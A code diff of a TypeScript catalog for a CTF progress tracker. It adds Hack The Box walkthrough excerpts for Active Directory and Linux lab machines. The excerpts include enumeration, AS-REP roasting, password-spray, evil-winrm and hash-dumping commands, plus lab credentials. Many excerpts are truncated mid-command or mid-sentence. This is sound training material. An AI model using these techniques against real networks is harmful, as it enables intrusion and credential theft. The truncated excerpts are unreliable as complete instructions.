@@ -1,6 +1,7 @@
 // SpecterCTF Master Target Catalog
 // 100% Pure CTF Challenges (TryHackMe & Hack The Box)
 // Daniel Dayan's Solved Roster: 45 HTB + 18 THM = 63 Pwned Targets
+// Enriched with 291 Official Hack The Box Walkthroughs & Intelligence
 import { Machine } from '../types';
 
 export const INITIAL_MACHINES: Machine[] = [
@@ -4174,11 +4175,12 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "Active Directory",
-      "RPC",
       "AS-REP Roasting",
-      "SeBackupPrivilege",
-      "BloodHound"
+      "Active Directory",
+      "Anonymous-/-Guest",
+      "BloodHound",
+      "RPC",
+      "SeBackupPrivilege"
     ],
     "certifications": [
       "CRTO",
@@ -4189,7 +4191,15 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Enumerate usernames via RPC over SMB, AS-REP roast audit2020 account, inspect BloodHound for forceChangePassword right on support, and abuse SeBackupPrivilege to copy NTDS.dit.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. Once user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump.",
+    "skillsLearned": [
+      "Leveraging Backup Operators group membership",
+      "Dumping credentials from LSASS",
+      "Anonymous / Guest"
+    ],
+    "officialPdf": "255-Blackfield_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBackfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. Once user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump.\n\n### 🎯 Core Skills\n- **Leveraging Backup Operators group membership**\n- **Dumping credentials from LSASS**\n- **Anonymous / Guest**\n\n### ⚔️ Foothold Vector\nAttempting anonymous and guest enumeration of SMB shares reveals a non-default share named profiles$ . There is also another non-default share called forensic that we don't have access to. Inspecting the profiles$ share reveals a list of user profile or document folders. A list of all usernames can be generated using smbclient -N \\\\\\\\10.10.10.192\\\\profiles$ -c ls | awk '{ print $1 }' , and saved to users.txt. With a user list and the Kerberos port open, we can try to spray the users Impacket's GetNpUsers.py in order to see if any user has Kerberos pre-authentication disabled. smbmap -u guest -H 10.10.10.192 GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.\n\n### 👑 Privilege Escalation\nWe can abuse the SeBackup privilege in order to retrieve files from the Administrator Desktop using robocopy. Using robocopy, we are able to retrieve a notes.txt but are denied access on root.txt. By reading the notes.txt file, we understand the root.txt flag is encrypted (probably with EFS), which is blocking our access with robocopy. Dumping Hashes with WBAdmin So we need to get into the Administrator context. On way to do this is to abuse SeBackup and SeRestore privileges in order to dump the AD database. Then, we can use the administrator NTLM hash in a PtH (Pass the Hash) attack to get a shell as them. First we need to install and configure a samba server with authentication."
   },
   {
     "id": "htb-sauna",
@@ -4200,11 +4210,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "Active Directory",
       "AS-REP Roasting",
+      "ASREPRoasting-Attack",
+      "Active Directory",
       "BloodHound",
-      "WinRM",
-      "Mimikatz"
+      "DCSync-Attack",
+      "Mimikatz",
+      "WinRM"
     ],
     "certifications": [
       "CRTO",
@@ -4215,7 +4227,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Gather employee names from 'About Us' page to generate usernames, AS-REP roast fsmith, discover internal registry credentials, and DCSync as svc_loanmanager.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Sauna is an easy difficulty Windows machine that features Active Directory",
+    "skillsLearned": [
+      "ASREPRoasting Attack",
+      "DCSync Attack"
+    ],
+    "officialPdf": "229-Sauna_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSauna is an easy difficulty Windows machine that features Active Directory\n\n### 🎯 Core Skills\n- **ASREPRoasting Attack**\n- **DCSync Attack**\n\n### ⚔️ Foothold Vector\n. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn't require Kerberos pre-authentication. This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions.\n\n### 👑 Privilege Escalation\nHaving gained a foothold on the machine, we can use a script such as WinPEAS to automate enumeration tasks. Use the upload command from our current WinRM session to transfer the binary to the remote server, and then run it. The script reveals that the user EGOTISTICALBANK\\svc_loanmanager has been set to automatically log in, and this account has the password Moneymakestheworldgoround! . Examination of C:\\Users\\ confirms that the similarly named svc_loanmgr has logged on locally. The command net user svc_loanmgr reveals that this user is also part of the Remote Management Users group. Use evil-winrm again to login as this new user. evil-winrm -i 10.10.10."
   },
   {
     "id": "htb-forest",
@@ -4226,11 +4245,12 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "Active Directory",
       "AS-REP Roasting",
-      "Exchange",
+      "ASREPRoasting",
+      "Active Directory",
       "BloodHound",
-      "DCSync"
+      "DCSync",
+      "Exchange"
     ],
     "certifications": [
       "CRTO",
@@ -4241,7 +4261,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Enumerate users without authentication via enumdomusers, AS-REP roast sebastien, inspect BloodHound for Exchange Windows Permissions membership, and perform DCSync.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.",
+    "skillsLearned": [
+      "ASREPRoasting"
+    ],
+    "officialPdf": "212-Forest_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nForest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.\n\n### 🎯 Core Skills\n- **ASREPRoasting**\n\n### ⚔️ Foothold Vector\n. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes. Skills Required Enumeration Skills Learned ASREPRoasting Enumeration with Bloodhound DCSync Attack Enumeration Nmap The machine appears to be a Domain Controller for the HTB.LOCAL domain. LDAP It's worth checking if the LDAP service allows anonymous binds using the ldapsearch tool. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -sC -sV -p$ports 10.10.10.\n\n### 👑 Privilege Escalation\nLet's use bloodhound to visualise the domain and look for privilege escalation paths. The python based ingestor can be installed with pip install bloodhound . There should be JSON files outputted in the folder, which can be uploaded to the bloodhound GUI. Search for the svc-alfresco user and mark it as owned. Double clicking on the node should display it's properties on the right. It's found that svc-alfresco is a member of nine groups through nested membership. Click on 9 to reveal the membership graph. One of the nested groups is found to be Account Operators , which is a privileged AD group."
   },
   {
     "id": "htb-resolute",
@@ -4253,10 +4279,11 @@ export const INITIAL_MACHINES: Machine[] = [
     "status": "backlog",
     "tags": [
       "Active Directory",
-      "RPC",
-      "Password Spray",
+      "DLL Injection",
       "DNSAdmins",
-      "DLL Injection"
+      "DnsAdmins-Abuse",
+      "Password Spray",
+      "RPC"
     ],
     "certifications": [
       "CRTO",
@@ -4267,7 +4294,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Find default password Welcome123! in user description via rpcclient, password spray users, find marko in DnsAdmins group, and exploit dnscmd /config /serverlevelplugindll for SYSTEM.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Resolute is an easy difficulty Windows machine that features Active Directory. The Active Directory anonymous bind is used to obtain a password that the sysadmins set for new user accounts, although it seems that the password for that account has since changed. A password spray reveals that this password is still in use for another domain user account, which gives us access to the system over WinRM. A PowerShell transcript log is discovered, which has captured credentials passed on the command-line. This is used to move laterally to a user that is a member of the DnsAdmins group.",
+    "skillsLearned": [
+      "DnsAdmins Abuse"
+    ],
+    "officialPdf": "220-Resolute_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nResolute is an easy difficulty Windows machine that features Active Directory. The Active Directory anonymous bind is used to obtain a password that the sysadmins set for new user accounts, although it seems that the password for that account has since changed. A password spray reveals that this password is still in use for another domain user account, which gives us access to the system over WinRM. A PowerShell transcript log is discovered, which has captured credentials passed on the command-line. This is used to move laterally to a user that is a member of the DnsAdmins group.\n\n### 🎯 Core Skills\n- **DnsAdmins Abuse**\n\n### ⚔️ Foothold Vector\nIt's quite possible that a new joiner also hasn't changed their initial password. Let's attempt a password spray with it. First, save the Windapsearch output to a file. Before we begin with the password spray, it would be wise to take a look at the account lockout policy of the domain controller, as a careless password spray along with a restrictive password lockout policy may lock out accounts. The lockoutThreshold: 0 indicates that there is no account lockout policy. Thus, we can go on and use the following bash script to loop through the user list and verify their credentials using rpcclient . This finds that the user melanie has the password Welcome123! .\n\n### 👑 Privilege Escalation\n. This doesn't reveal anything interesting, and we can use the -force option. This reveals the hidden directory C:\\PSTranscripts\\ . This directory in turn, contains the hidden subdirectory C:\\PSTranscripts\\20191203\\ . After running the command dir -force again, we see the hidden file: C:\\PSTranscripts\\20191203\\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.t xt . It seems that PowerShell Transcription logging is enabled on this system. This can be interesting in cases that passwords are passed over the command-line. Examination of this file reveals that the net use command syntax was incorrect."
   },
   {
     "id": "htb-cascade",
@@ -4278,11 +4311,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "AD Recycle Bin",
+      "AES-Encryption",
       "Active Directory",
+      "Active-Directory",
       "LDAP",
       "SQLite",
-      "VNC",
-      "AD Recycle Bin"
+      "VNC"
     ],
     "certifications": [
       "CRTO",
@@ -4293,7 +4328,15 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Find encrypted LDAP password in SQLite database audit.db, decrypt reversible password with Python, inspect AD Recycle Bin to restore deleted user, and decrypt VNC password.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and",
+    "skillsLearned": [
+      "TightVNC Password Extraction",
+      "AES Encryption",
+      "Active Directory"
+    ],
+    "officialPdf": "235-Cascade_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and\n\n### 🎯 Core Skills\n- **TightVNC Password Extraction**\n- **AES Encryption**\n- **Active Directory**\n\n### ⚔️ Foothold Vector\nTightVNC The registry file found contains a Password attribute, with the corresponding value consisting of hexadecimal characters. This writeup demonstrates how TightVNC passwords can be decrypted using Metasploit. Use the commands below to decrypt the password. The key variable is the known hardcoded DES key that has been extracted from the program. The Rex::Proto::RFB::Cipher.decrypt function is used to decrypt the password with the provided key. The password for s.smith is revealed as sT333ve2 . Let's check if this user belongs to the Remote Management Users group, as this would allow us to connect using Evil-WinRM .\n\n### 👑 Privilege Escalation\nflag is not available. import pyaes from base64 import b64decode key = b\"c4scadek3y654321\" iv = b\"1tdyjCbY1Ix49842\" aes = pyaes.AESModeOfOperationCBC(key, iv = iv) decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')) print(decrypted.decode()) evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd Privilege Escalation Let's enumerate the group membership of our current user. The user is identified to belong to the AD Recycle Bin group. The Active Directory Recycle Bin is used to recover deleted Active Directory objects such as Users, Groups, OUs etc. The objects keep all their properties intact while in the AD Recycle Bin, which allows them to be restored at any point."
   },
   {
     "id": "htb-monteverde",
@@ -4306,9 +4349,11 @@ export const INITIAL_MACHINES: Machine[] = [
     "tags": [
       "Active Directory",
       "Azure AD Connect",
-      "Password Spray",
+      "BloodHound",
       "MSOL",
-      "BloodHound"
+      "Password Spray",
+      "Password-Spraying",
+      "Using-sqlcmd"
     ],
     "certifications": [
       "CRTO",
@@ -4319,7 +4364,15 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Enumerate domain users over RPC, spray username as password to find sabatch credentials, log in via Evil-WinRM, and extract Azure AD Connect sync account (MSOL) cleartext password.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Monteverde is a Medium Windows machine that features Azure AD Connect. The domain is enumerated and a user list is created. Through password spraying, the SABatchJobs service account is found to have the username as a password. Using this service account, it is possible to enumerate SMB Shares on the system, and the $users share is found to be world-readable. An XML file used for an Azure AD account is found within a user folder and contains a password. Due to password reuse, we can connect to the domain controller as mhope using WinRM.",
+    "skillsLearned": [
+      "Password Spraying",
+      "Using sqlcmd",
+      "Azure AD Connect Password Extraction"
+    ],
+    "officialPdf": "223-Monteverde_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nMonteverde is a Medium Windows machine that features Azure AD Connect. The domain is enumerated and a user list is created. Through password spraying, the SABatchJobs service account is found to have the username as a password. Using this service account, it is possible to enumerate SMB Shares on the system, and the $users share is found to be world-readable. An XML file used for an Azure AD account is found within a user folder and contains a password. Due to password reuse, we can connect to the domain controller as mhope using WinRM.\n\n### 🎯 Core Skills\n- **Password Spraying**\n- **Using sqlcmd**\n- **Azure AD Connect Password Extraction**\n\n### ⚔️ Foothold Vector\nWe have our user list, and for our password spraying attempt we can use a very short list of statistically likely passwords. It's worth appending the discovered usernames to this list, as having a password of the username is unfortunately a common practice. Next, we can use CrackMapExec to perform the password spray, noting that there is no risk in the accounts locking out owning to the absence of an account lockout policy. wget https://raw.githubusercontent.com/insidetrust/statistically-likely- usernames/master/weak-corporate-passwords/english-basic.txt cat users.txt >> english-basic.txt crackmapexec smb 10.10.10.172 -d megabank -u users.txt -p english-basic.txt SMB 10.10.10.\n\n### 👑 Privilege Escalation\nDSE [+] Found: DC=MEGABANK,DC=LOCAL [+] Attempting bind [+] ...success! Binded as: [+] None [+] Enumerating all AD users [+] Found 10 users: cn: Guest cn: AAD_987d7f2f57d2 cn: Mike Hope userPrincipalName: mhope@MEGABANK.LOCAL cn: SABatchJobs userPrincipalName: SABatchJobs@MEGABANK.LOCAL cn: svc-ata userPrincipalName: svc-ata@MEGABANK.LOCAL cn: svc-bexec userPrincipalName: svc-bexec@MEGABANK.LOCAL cn: svc-netapp userPrincipalName: svc-netapp@MEGABANK.LOCAL The output returns a few interesting users. SABatchJobs might be a service account dedicated to running batch jobs, and is perhaps unusual for having a mixed-case name."
   },
   {
     "id": "htb-intelligence",
@@ -4330,12 +4383,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "Active Directory",
-      "PDF Metadata",
       "AD CS",
-      "ESC1",
+      "ADIDNS-abuse",
+      "Active Directory",
+      "BloodHound",
       "Certipy",
-      "BloodHound"
+      "ESC1",
+      "PDF Metadata",
+      "ReadGMSAPassword-abuse"
     ],
     "certifications": [
       "CRTO",
@@ -4346,7 +4401,15 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Download public PDF files with script, extract creator usernames and default passwords from metadata, inject DNS records to intercept service traffic, and abuse AD CS ESC1 certificate template.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute- forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system.",
+    "skillsLearned": [
+      "ADIDNS abuse",
+      "ReadGMSAPassword abuse",
+      "Constrained delegation abuse"
+    ],
+    "officialPdf": "357-Intelligence_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nIntelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute- forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system.\n\n### 🎯 Core Skills\n- **ADIDNS abuse**\n- **ReadGMSAPassword abuse**\n- **Constrained delegation abuse**\n\n### ⚔️ Foothold Vector\non the system. A scheduled PowerShell script that sends authenticated requests to web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is allowed to read the password of a group managed service account, which in turn has constrained delegation access to the domain controller, resulting in a shell with administrative privileges.\n\n### 👑 Privilege Escalation\nOne of the internal documents retrieved during the initial phase hinted at potential security issues with service accounts. Using the newly obtained credentials for Ted.Graves we can enumerate the domain with the tool Bloodhound. We run the bloodhound-python ingestor: We import the collected Json files in Bloodhound and then look at Shortest Paths to High Value Targets : We can see that our user is a member of the ITSUPPORT group, which has ReadGMSAPassword rights on SVC_INT which in turn has AllowedToDelegate rights to the Domain Controller. We can use the gMSADumper tool to get the service account password hash: bloodhound-python -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10."
   },
   {
     "id": "htb-scrambled",
@@ -4358,10 +4421,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "status": "backlog",
     "tags": [
       "Active Directory",
+      "Deserialization",
+      "Deserialization-attacks",
+      "Kerberoasting",
       "Kerberos",
       "MSSQL",
-      "Deserialization",
-      "Silver Ticket"
+      "Silver Ticket",
+      "Silver-ticket-attack"
     ],
     "certifications": [
       "CRTO",
@@ -4372,7 +4438,15 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Find NTLM hash in network packet capture, crack with hashcat, authenticate to MSSQL service over Kerberos, forge a Silver Ticket, and trigger .NET binary formatter deserialization.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user ksimpson . On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the Public share with the credentials of ksimpson , a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine.",
+    "skillsLearned": [
+      "Kerberoasting",
+      "Silver ticket attack",
+      "Deserialization attacks"
+    ],
+    "officialPdf": "476-Scrambled_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nScrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user ksimpson . On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the Public share with the credentials of ksimpson , a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine.\n\n### 🎯 Core Skills\n- **Kerberoasting**\n- **Silver ticket attack**\n- **Deserialization attacks**\n\n### ⚔️ Foothold Vector\nTo perform the silver ticket attack against the SQL service we need three things: 1. The NTLM hash of the password of the SqlSvc account. 2. The domain SID. 3. The SPN that the SqlSvc account is using. First of all, we need to get the NTLM hash of the password we cracked. For this task we can use this online tool to get the following hash: B999A16500B87D17EC7F2E2A68778F05 . Then, we need to find the Security Identifier (SID) of the domain. For that, we can use ldapsearch . Since, NTLM authentication is disabled we have to get a Kerberos ticket for ksimpson to access ldap. To get a Kerberos ticket we can use kinit with the following /etc/krb5.conf file: Now, we can use ldapsearch.\n\n### 👑 Privilege Escalation\nLooking around the remote file system as the user MiscSvc we find that we have access on the C:\\shares\\IT share. Let's use impacket-smbclient to access the files on the remote share. Looking inside the Apps\\Sales Order Client we find an application along with a DLL file: We can use the command mget * to download the files and in order to make our analysis easier we can switch to a Windows environment and examine the files there. Executing the application on Windows environment we are presented with a login prompt. impacket-smbclient -k scrm.local/MiscSvc:ScrambledEggs9900@DC1.scrm.local First of all we will need to specify a server name by clicking the edit option and selecting dc1.scrm."
   },
   {
     "id": "htb-bastion",
@@ -4383,10 +4457,11 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "Windows",
+      "Exploiting-MRemoteNG",
+      "SAM Hive",
       "SMB",
       "VHD",
-      "SAM Hive",
+      "Windows",
       "mpart",
       "msoffice"
     ],
@@ -4398,7 +4473,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Mount anonymous SMB share containing Windows backup .vhd image, attach VHD locally to extract SAM and SYSTEM registry hives, and crack local Administrator hash.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Bastion is an Easy level WIndows box which contains a VHD ( Virtual Hard Disk ) image from which credentials can be extracted. After logging in, the software MRemoteNG is found to be installed which stores passwords insecurely, and from which credentials can be extracted.",
+    "skillsLearned": [
+      "Extracting passwords from SAM",
+      "Exploiting MRemoteNG"
+    ],
+    "officialPdf": "186-Bastion_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBastion is an Easy level WIndows box which contains a VHD ( Virtual Hard Disk ) image from which credentials can be extracted. After logging in, the software MRemoteNG is found to be installed which stores passwords insecurely, and from which credentials can be extracted.\n\n### 🎯 Core Skills\n- **Extracting passwords from SAM**\n- **Exploiting MRemoteNG**\n\n### ⚔️ Foothold Vector\nUsing the credentials l4mpje / bureaulampje we can now login via SSH. ssh l4mpje@10.10.10.134 # password : bureaulampje We can now read the flag on the Desktop.\n\n### 👑 Privilege Escalation\nENUMERATION Let's enumerate the installed programs on the box. cd C:\\Progra~2 dir cd mRemoteNG We find mRemoteNG to be installed. A quick google search about it says that it's a remote connection manager and stores credentials too. Looking at the changelog.txt we that the version is 1.76.11. According to the article, http://hackersvanguard.com/mremoteng-insecure-password-storage/"
   },
   {
     "id": "htb-silo",
@@ -4409,11 +4491,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "Windows",
+      "Database",
+      "Enumerating-Oracle-SIDs",
       "Oracle",
       "TNS Listener",
-      "odat.py",
-      "Database"
+      "Windows",
+      "execute-files",
+      "odat.py"
     ],
     "certifications": [
       "OSCP"
@@ -4423,7 +4507,16 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Enumerate Oracle TNS listener on port 1521 using odat.py to find SID XE and scott:tiger credentials, then upload webshell via dbms_export_extension or java payload.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Silo focuses mainly on leveraging Oracle to obtain a shell and escalate privileges. It was intended to be completed manually using various tools, however Oracle Database Attack Tool greatly simplifies the process, reducing the difficulty of the machine substantially.",
+    "skillsLearned": [
+      "Enumerating Oracle SIDs",
+      "Enumerating Oracle credentials",
+      "Leveraging Oracle to upload and",
+      "execute files"
+    ],
+    "officialPdf": "131-Silo_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSilo focuses mainly on leveraging Oracle to obtain a shell and escalate privileges. It was intended to be completed manually using various tools, however Oracle Database Attack Tool greatly simplifies the process, reducing the difficulty of the machine substantially.\n\n### 🎯 Core Skills\n- **Enumerating Oracle SIDs**\n- **Enumerating Oracle credentials**\n- **Leveraging Oracle to upload and**\n- **execute files**\n\n### ⚔️ Foothold Vector\nOracle ODAT: https://github.com/quentinhardy/odat Using Oracle Database Attack Tool (ODAT), it is fairly straightforward to obtain a valid SID. ODAT can also be leveraged to brute force some credentials, however the default ODAT wordlist is uppercase-only, so it must be substituted with the Metasploit wordlist (which requires changing the combo separator from space to /). If installing ODAT for the first time, follow the installation steps closely on the Github page, or use one of the static releases."
   },
   {
     "id": "htb-time",
@@ -4434,10 +4527,15 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "Linux",
-      "Java",
-      "Jackson Deserialization",
+      "CVE-2019-12384",
+      "CVE-2019-12814",
+      "CVE-2019-14439",
       "CVE-2020-24616",
+      "Jackson Deserialization",
+      "Java",
+      "Java-Deserialization",
+      "Linux",
+      "System-Timer",
       "Systemd"
     ],
     "certifications": [
@@ -4449,7 +4547,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Exploit Jackson polymorphic deserialization (CVE-2020-24616) in online JSON beautifier tool using SSRF/JNDI payload, and abuse writable timer script executed by root systemd service.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Time is a medium difficulty Linux machine that features an online JSON parser web application. This application is found to suffer from a Java Deserialization vulnerability, which is leveraged to gain a foothold on the box. Post-exploitation",
+    "skillsLearned": [
+      "Java Deserialization",
+      "System Timer"
+    ],
+    "officialPdf": "286-Time_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTime is a medium difficulty Linux machine that features an online JSON parser web application. This application is found to suffer from a Java Deserialization vulnerability, which is leveraged to gain a foothold on the box. Post-exploitation\n\n### 🎯 Core Skills\n- **Java Deserialization**\n- **System Timer**\n\n### 🛡️ Associated CVEs\n`CVE-2019-12384`, `CVE-2019-12814`, `CVE-2019-14439`\n\n### ⚔️ Foothold Vector\non the box. Post-exploitation enumeration reveals that a system timer is executing a word-writable bash script. This is leveraged to gain a\n\n### 👑 Privilege Escalation\nenumeration reveals that a system timer is executing a word-writable bash script. This is leveraged to gain a root shell on the server. Skills Required Enumeration Basic Java Knowledge OWASP Top 10 Familiarity Skills Learned Java Deserialization System Timer Exploitation Enumeration Nmap output reveals that the target server has ports 22 (OpenSSH) and 80 (Apache httpd) open. Let's browse to port 80. The web server is hosting an online JSON beautification and validation application. The dropdown menu contains the two options Beautify and Validate (beta!) . Let's input sample JSON data in the input field, select Beautify option and click on the PROCESS button."
   },
   {
     "id": "htb-sneakymailer",
@@ -4460,12 +4565,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "Linux",
-      "SMTP",
-      "Phishing",
       "IMAP",
+      "Linux",
+      "Package Hijack",
+      "Phishing",
       "PyPI",
-      "Package Hijack"
+      "PyPI-Package",
+      "SMTP"
     ],
     "certifications": [
       "CPTS"
@@ -4475,7 +4581,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "hint": "Enumerate email addresses with smtp-user-enum, send phishing email with listener URL to capture clicked credentials, access IMAP mailbox, and upload malicious Python module to local PyPI server.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "SneakyMailer is a medium difficulty Linux machine that features a phishing scenario, from which a set of credentials are gained. These credentials provide access to a mailbox, which reveals another set of credentials to access the FTP service. FTP file upload allows a foothold to be gained. PyPI server package installation can be exploited to move laterally. Root access can be obtained by leveraging sudo privileges.",
+    "skillsLearned": [
+      "Phishing",
+      "PyPI Package"
+    ],
+    "officialPdf": "262-SneakyMailer_HTB_Official_writeup_Tamarisk.pdf",
